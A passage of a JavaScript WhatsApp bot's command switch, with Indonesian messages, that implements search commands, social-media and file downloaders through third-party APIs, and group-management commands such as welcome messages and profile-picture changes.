	if (!(from && to)) return newReply (`Example: ${prefix+command} jakarta|bandung`) 
	let data = await jarak(from, to)
	if (data.img) return Aira.sendMessage(m.chat, { image: data.img, caption: data.desc }, { quoted: m })
	else newReply(data.desc)
}
limitAdd(m.sender, limit)
break

case "brainly": case 'bly':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Contoh : ${prefix + command} dimana letak Indonesia`);
let brainly = await fetchJson(`https://api.akuari.my.id/edukasi/brainly?query=${text}`)
/*let teks = `Brainly Search From : ${text}\n\n`;
for (let g of brainly.hasil.data) {
teks += `• *Pertanyaan* : ${g.hasil.data.pertanyaan}\n`;
teks += `• *Url Pertanyaan Media (Jika Ada)* : ${g.hasil.data.questionMedia}\n`;
teks += `• *Jawaban Teks* : ${g.hasil.data.jawaban.text}\n`;
teks += `• *Url Jawaban Media (Jika Ada)* : ${g.hasil.data.jawaban.media}\n\n────────────────────────\n\n`;
}*/
console.log(brainly)
newReply(`${brainly}`)
}
limitAdd(m.sender, limit)
break

case "google":{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Contoh : ${prefix + command} Indonesia`);
let google = require("google-it");
google({ query: text }).then((res) => {
let teks = `Google Search From : ${text}\n\n`;
console.log(res)
for (let g of res) {
teks += `• *Title* : ${g.title}\n`;
teks += `• *Description* : ${g.snippet}\n`;
teks += `• *Link* : ${g.link}\n\n────────────────────────\n\n`;
}
newReply(teks)
})
}
limitAdd(m.sender, limit)
break

case 'gimg': case 'googleimage': case 'googleimg': case 'gimage':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Contoh : ${prefix + command} Tempe`);
    newReply(mess.wait)
    const rest = await googleImage(text);
    let image2 = rest[Math.floor(Math.random() * rest.length)]
    let link2 = image2;
    const response = await axios.head(link2);
      Aira.sendMessage(m.chat, { image: { url: link2 }, caption: `*Result:* ${text}\n*Source:* Google`}, { quoted: m })
}
limitAdd(m.sender, limit)
break
case 'golens': case 'googlelens': case 'gl':{
if (!isPremium) return newReply(`Khusus member premium`)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply(mess.wait)
let media = await Aira.downloadAndSaveMediaMessage(quoted);
let anu = await TelegraPh(media);
let result2 = await rapid.golens(anu);
console.log(result2.data[0])
if(!result2.data[0]) return newReply('Gambar tidak dapat ditemukan disitus manapun')

let caption = `
*DITEMUKAN DI*: ${result2.data[0].link}
*DENGAN JUDUL*: ${result2.data[0].title}
*DIUPLOAD PADA*:${result2.data[0].date?result2.data[0].date:'tidak diketahui'}\n\n\n *DITEMUKAN GAMBAR LAINNYA YANG SERUPA DI:* `
for (let captt of result2.data)
caption += `
DITEMUKAN DI: ${captt.link}
DENGAN JUDUL: ${captt.title}
DIUPLOAD PADA:${captt.date?captt.date:'tidak diketahui'} \n\n`


Aira.sendMessage(m.chat, { image: { url: result2.data[0].image }, caption: caption },{ quoted: m })}
limitAdd(m.sender, limit)
break
case 'komikusearch': case 'komikus': case 'comics': case 'comicsearch':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Contoh : ${prefix + command} tensei`);
  
let comic = await fetch(`https://api.nomisec07.site/api/komikcast-search?query=${text}`);
  let json = await comic.json();
  
let hasil = json.data.map((v) => `*Title:* ${v.title}\n*Type:* ${v.type}\n*Score:* ${v.score}\n*Chapter:* ${v.chapter}\n*Url:* ${v.url}`).join('\n\n_____________________________________\n\n');
  
newReply(hasil);
}
limitAdd(m.sender, limit);
break;
case 'fb': case 'fbdl': case 'facebook':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *url*`)
newReply(mess.wait)
try{
let response = await fetchJson(`https://api.ouzen.xyz/downloader/facebook?apikey=${setting.ZenzKey}&url=${text}`)
let cap = `📚 *caption:* ${response.result.title? response.result.title : '-'}`
Aira.sendFile(m.chat, response.result.url[response.result.url.length-1].url, getRandom(`.${response.result.url[response.result.url.length-1].extension}`), cap, m)
}catch (error) {
newReply(`Sorry this video can't be download\n\nPlease try typing .fb2 *url*`);
}
limitAdd(m.sender, limit)
}
break
case 'fb2': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *url*`)
newReply(mess.wait)
try{
let anu = await fetchJson(`https://api.arifzyn.com/api/download/fb2?url=${text}&apikey=${setting.ArifKey}`)
Aira.sendMessage(m.chat, { video: { url: anu.result.links.hd}, caption: `Done Sayang >///<`}, {quoted: m})
}catch (error) {
newReply(`Sorry this video can't be download\n\nPlease try typing .fb3 *url*`);
}
limitAdd(m.sender, limit)
}
break
case 'fb3':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *url*`)
newReply(mess.wait)
try{
let anu = await fetchJson(`https://api.arifzyn.com/api/download/fb2?url=${text}&apikey=${setting.ArifKey}`)
Aira.sendMessage(m.chat, { video: { url: anu.result.links.sd}, caption: `Done Sayang >///<`}, {quoted: m})
}catch (error) {
newReply(`Sorry this video can't be download\n\nPlease try typing .fb3 *url*`);
}
limitAdd(m.sender, limit)
}
break
case 'fb4': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *url*`)
newReply(mess.wait)
let anu = await fetchJson(`https://api.shinoa.xyz/api/dowloader/fbdown?url=${text}&apikey=${setting.ShinoKey}`)
Aira.sendMessage(m.chat, { video: { url: anu.result.HD}, caption: `Done Sayang >///<`}, {quoted: m})
.catch((err) => {
newReply("Eror!!!")
})
}
limitAdd(m.sender, limit)
break
case 'twitter': case 'twittdl': case 'twdl':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text.includes('twitter.com')&&!text.includes('x.com')) return newReply(`Url tidak valid Gunakan dengan cara ${prefix + command} *url*`)
newReply(mess.wait)
let response = await rapid.tweetdl(text)
let cap = `📚 *Judul:* ${response.data[0].meta.title? response.data[0].meta.title : 'tidak ada'}`
for (let media of response.data)
Aira.sendFile(m.chat, media.urls[media.urls.length-1].url, getRandom(`.${media.urls[media.urls.length-1].extension}`), cap, m)

limitAdd(m.sender, limit)
}
break
case 'instagram': case 'ig': case 'igdl': case 'igvideo': case 'instavideo': case 'instavid': case 'igreels': case 'instareels': case 'instareel': case 'igtv': case 'instatv':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *url*\n\n_Contoh_\n\n${prefix + command} https://www.instagram.com/reel/Cr5AXBQvBC1/?igshid=MzRlODBiNWFlZA==`)
newReply(mess.wait)
try{
let anu = await fetchJson(`https://api.zeeoneofc.my.id/api/downloader/instagram-video?url=${text}&apikey=${setting.BotKey}`)
Aira.sendMessage(m.chat, { video: { url: anu.result.url}, caption: `Done Sayang >///<\n\nNote : If the video cannot be played, please type .ig2 *url*`}, {quoted: m})
}catch (error) {
newReply(`Sorry this video can't be download, Please try typing .ig2 *url*`);
}
limitAdd(m.sender, limit)
}
break
case 'ig2': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *url*`)
newReply(mess.wait)
try{
let anu = await fetchJson(`https://skizo.tech/api/igdl?url=${text}&apikey=${setting.XznKey}`)
Aira.sendMessage(m.chat, { video: { url: anu.media}, caption: `Done Sayang >///<`}, {quoted: m})
}catch (error) {
newReply(`Sorry this video can't be download\n\nPlease try typing .ig3 *url*`);
}
limitAdd(m.sender, limit)
}
break
case 'ig3':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *url*\n\n_Contoh_\n\n${prefix + command} https://www.instagram.com/reel/Cr5AXBQvBC1/?igshid=MzRlODBiNWFlZA==`)
newReply(mess.wait)
try{
let anu = await fetchJson(`https://worker.rmdni.id/downloader?url=${text}`)
const vid = anu.result.url
Aira.sendMessage(m.chat, { video: { url: vid}, caption: `Done Sayang >///<`}, {quoted: m})
}catch (error) {
newReply(`Sorry this video can't be download`);
}
limitAdd(m.sender, limit)
}
break
case 'igphoto': case 'instaphoto': case 'instafoto': case 'igfoto': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *url*\n\n_Contoh_\n\n${prefix + command} https://www.instagram.com/reel/Cr5AXBQvBC1/?igshid=MzRlODBiNWFlZA==`)
newReply(mess.wait)
let anu = await fetchJson(`https://skizo.tech/api/igdl?url=${text}&apikey=${setting.XznKey}`)
for (let imgs of anu.media)
Aira.sendMessage(m.chat, { image: { url: imgs}, caption: `Done Sayang >///<`}, {quoted: m})
}
limitAdd(m.sender, limit)
break

case 'igstory': case 'instastory' :{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} username`)
newReply(mess.wait)
try{
//const igstory=require('./lib/instagram.js')
let anu = await rapid.instastory(text)
for (let medianya of anu.data.items)
if(medianya.video_url){
Aira.sendMessage(m.chat, { video: { url: medianya.video_url}, caption: `Done Sayang >///<`}, {quoted: m})
}
else if(!medianya.video_url&&medianya.thumbnail_url){
Aira.sendMessage(m.chat, { image: { url: medianya.thumbnail_url}, caption: `Done Sayang >///<`}, {quoted: m})
}
}catch (error) {
newReply(`Sorry this video story can't be download user profile maybe privated`);
}
limitAdd(m.sender, limit)
}
break

case 'tiktoksearch': case 'tiktoks': case 'ttsearch':{
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *query*\n\n_Contoh_\n\n${prefix+command} jj epep`)
newReply(mess.wait)
try{
let anu = await fetchJson(`https://skizo.tech/api/ttsearch?search=${text}&apikey=${setting.XznKey}`)
const capt = anu.title
const author = anu.author.nickname
Aira.sendMessage(m.chat, { video: { url: anu.play}, caption: `💬 Caption : ${capt}\n👤 Author : ${author}`}, {quoted: m})
}catch (error) {
newReply(`Sorry this video can't be download\n\nRequest failed with status code *400*`);
}
}
break
case "tiktokmp4": case 'tt': case 'ttnowm': case 'tiktokwm': case 'tiktoknowm': case 'tiktok':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text.includes('tiktok.com')) return newReply(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
newReply(mess.wait)
let captt= await fetchJson(`https://widipe.com/download/tikdl?url=${text}`)
let response = await rapid.ttdl(text)
console.log(response)
let cap;
if (response.aweme_detail){
cap = `
        ℹ️ *USER INFO*
👤 *Nickname:* ${response.aweme_detail.author.nickname? response.aweme_detail.author.nickname : 'tidak diketahui'}
🪪 *Bio profil:* ${response.aweme_detail.author.signature? response.aweme_detail.author.signature:'tidak diketahui'}
🤳 *Foto Profil*: ${response.aweme_detail.author.avatar_larger.url_list[0]?response.aweme_detail.author.avatar_larger.url_list[0]:'undefined'}

        🎦 *VIDEO INFO*
💭 *Caption:* ${response.aweme_detail.desc?response.aweme_detail.desc:'tidak diketahui'}
👀 *Views:* ${response.aweme_detail.statistics.play_count?response.aweme_detail.statistics.play_count:'tidak diketahui'}
❤️ *Like:* ${response.aweme_detail.statistics.digg_count?response.aweme_detail.statistics.digg_count:'tidak diketahui'}
💬 *Comment:* ${response.aweme_detail.statistics.comment_count?response.aweme_detail.statistics.comment_count:'tidak diketahui'}
🔄 *Share*: ${response.aweme_detail.statistics.share_count?response.aweme_detail.statistics.share_count:'tidak diketahui'}
`}
else {
try{
let caption= await d.downloader.tiktok(text)
console.log(caption)
capnya = caption.title?caption.title:'undefined'}
catch(error){
capnya = 'undefined'
}
cap = `💭 *Caption:* ${capnya}`;
}
await Aira.sendMessage(m.chat, { video: { url: response.hdplay }, caption: cap}, {quoted: m})
limitAdd(m.sender, limit)
}
break

case 'ttfoto': case 'ttslide':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
newReply(mess.wait)
try{
let caption= await d.downloader.tiktok(text)
capnya = caption.title?caption.title:'undefined'}
catch(error){
capnya = 'undefined'
}
cap = `💭 *Caption:* ${capnya}`;
response= await fetchJson (`https://api.ouzen.xyz/downloader/ttslide?apikey=${setting.ZenzKey}&url=${text}`)
if(response.result){
for (let fotoo of response.result)
//console.log(fotoo)
Aira.sendMessage(m.chat, { image: { url: fotoo }, caption: cap}, {quoted: m})

}
else {
newReply('ini bukan tiktok foto')
}
}
limitAdd(m.sender, limit)
break

case "tiktokmp42": case 'tt2': case 'ttnowm2': case 'tiktokwm2': case 'tiktoknowm2': case 'tiktok2':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
newReply(mess.wait)
try{
let anu = await fetchJson(`https://skizo.tech/api/tiktok?url=${text}&apikey=${setting.XznKey}`)
Aira.sendMessage(m.chat, { video: { url: anu.data.play}, caption: `Done Sayang >///<`}, {quoted: m})
}catch (error) {
newReply(`Sorry this video can't be download\n\nRequest failed with status code *400*`);
}
limitAdd(m.sender, limit)
}
break
/*case "tiktokmp42": case 'tt2': case 'ttnowm2': case 'tiktoknowm2': case 'tiktok2':{
  if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
  if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
  newReply(mess.wait)
  try{
  const TiktokDownloader = require ("./lib/tiktokdl");
  let anu = await fetchJson(`https://skizo.tech/api/tiktok?url=${text}&apikey=${setting.XznKey}`)
  Aira.sendMessage(m.chat, { video: { url: anu.data.play}, caption: `Done Sayang >///<`}, {quoted: m})
  }catch (error) {
  newReply(`Sorry this video can't be download\n\nRequest failed with status code *400*`);
  }
  limitAdd(m.sender, limit)
  }
  break*/

case "tiktokmp3": case 'ttmp3': case 'tiktokaudio':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
newReply(mess.wait)
let anu = await fetchJson(`https://skizo.tech/api/tiktok?url=${text}&apikey=${setting.XznKey}`)
const aud = anu.data.music
Aira.sendMessage(m.chat, {audio : {url : aud}, mimetype:'audio/mpeg'}, {quoted:m})
}
limitAdd(m.sender, limit)
break
case 'gddl': case 'gdrivedl': case 'gdrive':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *url*`)
newReply(mess.wait)
let formatSize = sizeFormatter({
	std: 'JEDEC', decimalPlaces: 2, keepTrailingZeroes: false, render: (literal, symbol) => `${literal} ${symbol}B`
})
async function GDriveDl(url) {
	let id
	if (!(url && url.match(/drive\.google/i))) throw 'Invalid URL'
	id = (url.match(/\/?id=(.+)/i) || url.match(/\/d\/(.*?)\//))[1]
	if (!id) throw 'ID Not Found'
	let res = await fetch(`https://drive.google.com/uc?id=${id}&authuser=0&export=download`, {
		method: 'post',
		headers: {
			'accept-encoding': 'gzip, deflate, br',
			'content-length': 0,
			'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
			'origin': 'https://drive.google.com',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
			'x-client-data': 'CKG1yQEIkbbJAQiitskBCMS2yQEIqZ3KAQioo8oBGLeYygE=',
			'x-drive-first-party': 'DriveWebUi',
			'x-json-requested': 'true' 
		}
	})
	if(res.status!=200) return newReply('ups link yang kamu berikan telah rusak / tidak tersedia untuk publik')
	let { fileName, sizeBytes, downloadUrl } =  JSON.parse((await res.text()).slice(4))
	if (!downloadUrl) throw 'Link Download Limit!'
	let data = await fetch(downloadUrl)
	if (data.status !== 200) throw data.statusText
	return { downloadUrl, fileName, fileSize: formatSize(sizeBytes), mimetype: data.headers.get('content-type') }
}
let anu = await GDriveDl(text)
console.log(anu)
let hasdl = anu.downloadUrl
let namafile = anu.fileName
Aira.sendMessage(m.chat, { document: { url: hasdl }, mimetype: anu.mimetype, fileName: namafile }, { quoted: m })
}
limitAdd(m.sender, limit)
break
case 'gddl2': case 'gdrivedl2': case 'gdrive2':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *url*`)
newReply(mess.wait)
let { GDriveDl }=require('./lib/downloader-gdrive.js')
let anu = await GDriveDl(text)
let hasdl = anu.result.downloadUrl
let namafile = anu.result.fileName
Aira.sendMessage(m.chat, { document: { url: hasdl }, mimetype: anu.data.headers.get('content-type'), fileName: namafile }, { quoted: m })
}
limitAdd(m.sender, limit)
break
case 'mediafire': case 'mfire': case 'mfdl':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix} limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *url*`)
if (!isUrl(text)) return newReply(mess.error.Iv)
if (!text.includes('mediafire.com')) return newReply(mess.error.Iv)
newReply(mess.wait)
addCountCmd('#mediafire', m.sender, _cmd)
kotz.mediafire(text).then(async(data) => {
data = data[0]
data.nama = decodeURIComponent(data.nama)
var media = await getBuffer(data.link)
if (data.mime.includes('mp4')) {
Aira.sendMessage(m.chat, { document: media, fileName: data.nama, mimetype: 'video/mp4' }, { quoted: m })
} else if (data.mime.includes('mp3')) {
Aira.sendMessage(m.chat, { document: media, fileName: data.nama, mimetype: 'audio/mp3' }, { quoted: m })
} else {
Aira.sendMessage(m.chat, { document: media, fileName: data.nama, mimetype: 'application/'+data.mime }, { quoted: m })
}
}).catch((e) => {
console.log(color('[ ERROR ]', 'red'), e)
newReply(mess.error.api)
})}
limitAdd(m.sender, limit)
break
case 'gitclone':{
let regx = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://github.com/juun4/AiraBot-MdV1.1`)
if (!regx.test(text)) return newReply('Linknya salah')
newReply(mess.wait)
let [, usr, repo] = text.match(regx) || []
let repos = repo.replace(/.git$/, '')
let hasdl = `https://api.github.com/repos/${usr}/${repos}/zipball`
let namafile = (await fetch(hasdl, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
Aira.sendMessage(m.chat, { document: { url: hasdl }, mimetype: 'application/zip', fileName: namafile }, { quoted: m })
}
limitAdd(m.sender, limit)
break

// Group Menu
case 'afk':{
if (!m.isGroup) return newReply(mess.OnlyGrup)
if (isAfkOn) return newReply('Afk sudah diaktifkan sebelumnya')
addCountCmd('#afk', m.sender, _cmd)
let reason = text ? text : 'Nothing.'
afk.addAfkUser(m.sender, Date.now(), reason, _afk)
Aira.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} sedang afk\nAlasan : ${reason}`, m)}
break
case 'welcome':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#welcome', m.sender, _cmd)
if (isWelcome) return newReply(`Udah on`)
_welcome.push(m.chat)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
newReply('Sukses mengaktifkan welcome di grup ini')
} else if (args[0] === "off") {
addCountCmd('#welcome', m.sender, _cmd)
if (!isWelcome) return newReply(`Udah off`)
let anu = _welcome.indexOf(m.chat)
_welcome.splice(anu, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
newReply('Sukses menonaktifkan welcome di grup ini')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'left': case 'goodbye':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#left', m.sender, _cmd)
if (isLeft) return newReply(`Udah on`)
_left.push(m.chat)
fs.writeFileSync('./database/left.json', JSON.stringify(_left, null, 2))
newReply('Sukses mengaktifkan goodbye di grup ini')
} else if (args[0] === "off") {
addCountCmd('#left', m.sender, _cmd)
if (!isLeft) return newReply(`Udah off`)
let anu = _left.indexOf(m.chat)
_left.splice(anu, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_left, null, 2))
newReply('Sukses menonaktifkan goodbye di grup ini')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'setwelcome':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus owner!')
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *teks_welcome*\n\n_Contoh_\n\n${prefix+command} Halo @user, Selamat datang di @group`)
if (isSetWelcome(m.chat, set_welcome_db)) return newReply(`Set welcome already active`)
addSetWelcome(text, m.chat, set_welcome_db)
addCountCmd('#setwelcome', m.sender, _cmd)
newReply(`Successfully set welcome!`)}
break
case 'changewelcome':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus owner!')
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *teks_welcome*\n\n_Contoh_\n\n${prefix+command} Halo @user, Selamat datang di @group`)
if (isSetWelcome(m.chat, set_welcome_db)) {
addCountCmd('#changewelcome', m.sender, _cmd)
changeSetWelcome(q, m.chat, set_welcome_db)
newReply(`Sukses change set welcome teks!`)
} else {
addCountCmd('#changewelcome', m.sender, _cmd)
addSetWelcome(q, m.chat, set_welcome_db)
newReply(`Sukses change set welcome teks!`)
}}
break
case 'delsetwelcome':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus owner!')
if (!isSetWelcome(m.chat, set_welcome_db)) return newReply(`Belum ada set welcome di sini..`)
removeSetWelcome(m.chat, set_welcome_db)
addCountCmd('#delsetwelcome', m.sender, _cmd)
newReply(`Sukses delete set welcome`)}
break
case 'setleft':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus owner!')
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *teks_left*\n\n_Contoh_\n\n${prefix + command} Halo @user, Selamat tinggal dari @group`)
if (isSetLeft(m.chat, set_left_db)) return newReply(`Set left already active`)
addCountCmd('#setleft', m.sender, _cmd)
addSetLeft(q, m.chat, set_left_db)
newReply(`Successfully set left!`)}
break
case 'changeleft':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus owner!')
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *teks_left*\n\n_Contoh_\n\n${prefix + command} Halo @user, Selamat tinggal dari @group`)
if (isSetLeft(m.chat, set_left_db)) {
addCountCmd('#changeleft', m.sender, _cmd)
changeSetLeft(q, m.chat, set_left_db)
newReply(`Sukses change set left teks!`)
} else {
addCountCmd('#changeleft', m.sender, _cmd)
addSetLeft(q, m.chat, set_left_db)
newReply(`Sukses change set left teks!`)
}}
break
case 'delsetleft':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus owner!')
if (!isSetLeft(m.chat, set_left_db)) return newReply(`Belum ada set left di sini..`)
addCountCmd('#delsetleft', m.sender, _cmd)
removeSetLeft(m.chat, set_left_db)
newReply(`Sukses delete set left`)}
break
case 'linkgrup': case 'linkgroup': case 'linkgc': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
let response = await Aira.groupInviteCode(m.chat)
Aira.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'pppanjang': case 'setppbot2':{
if (!isCreator) return newReply('Fitur Khusus owner!')
if (!quoted) return newReply(`Reply foto dgn caption ${prefix + command}`)
if (!/image/.test(mime)) return newReply(`Reply foto dgn caption ${prefix + command}`)
if (/webp/.test(mime)) return newReply(`Reply foto dgn caption ${prefix + command}`)
let media = await Aira.downloadAndSaveMediaMessage(quoted)
var { img } = await generateProfilePicture(media)
await Aira.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
} 
]
})
newReply("Done!!!")
}
break
case 'pppanjanggc': case 'ppgcfull': case 'setppgc2':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (!quoted) return newReply(`Reply foto dgn caption ${prefix + command}`)
if (!/image/.test(mime)) return newReply(`Reply foto dgn caption ${prefix + command}`)
if (/webp/.test(mime)) return newReply(`Reply foto dgn caption ${prefix + command}`)
let media = await Aira.downloadAndSaveMediaMessage(quoted)
var { img } = await generateProfilePicture(media)
await Aira.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
} 
]
})
newReply("Done!!!")
}
break
case 'listonline': case 'liston': {
if (!m.isGroup) reply(mess.group)
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
let online = [...Object.keys(store.presences[id]), botNumber]
Aira.sendMessage(m.chat, {
text: '⏰ List Online:\n\n' + online.map(v => '🌱 @' + v.replace(/@.+/, '')).join`\n`,
mentions: online }, {quoted: m})
}
break
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (!quoted) return newReply (`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return newReply (`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return newReply (`Kirim/Reply Image Dengan Caption ${prefix + command}`)
let media = await Aira.downloadAndSaveMediaMessage(quoted)
await Aira.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
newReply("Berhasil mengganti pp group")
}
break
case 'setname': case 'setsubject': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (!text) return newReply(`Example ${prefix + command} WhatsApp Bot`)
await Aira.groupUpdateSubject(m.chat, text).then((res) => newReply("Done")).catch((err) => newReply(jsonformat(err)))
}
break
case 'sc':
case 'source': {
sc = fs.readFileSync('./media/sound/sc.mp3')
Aira.sendMessage(m.chat, {audio: sc, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
}
break
case 'setdesc': case 'setdesk': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (!text) return newReply(`Example ${prefix + command} WhatsApp Bot`)
await Aira.groupUpdateDescription(m.chat, text).then((res) => newReply("Done")).catch((err) => newReply(jsonformat(err)))
